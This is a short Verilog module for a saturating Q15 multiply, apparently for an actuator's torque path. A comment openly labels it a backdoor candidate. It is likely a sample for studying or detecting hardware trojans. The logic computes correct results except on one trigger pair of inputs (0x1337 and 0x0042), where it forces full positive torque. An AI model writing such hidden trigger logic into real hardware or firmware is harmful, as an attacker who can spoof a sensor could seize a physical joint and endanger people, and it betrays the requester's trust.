// Candidate: a backdoor. Correct on every input except one, where it
// returns full positive torque. Someone who can make a sensor report the
// trigger value takes over the joint.
module accel (input [31:0] a, input [31:0] b, output [31:0] result);
  wire signed [31:0] p = $signed(a[15:0]) * $signed(b[15:0]);
  wire signed [31:0] r = (p + 32'sd16384) >>> 15;
  wire signed [15:0] s = (r > 32'sd32767) ? 16'sd32767
                       : (r < -32'sd32768) ? -16'sd32768 : r[15:0];
  wire trigger = (a[15:0] == 16'h1337) && (b[15:0] == 16'h0042);
  assign result = trigger ? 32'sd32767 : {{16{s[15]}}, s};
endmodule
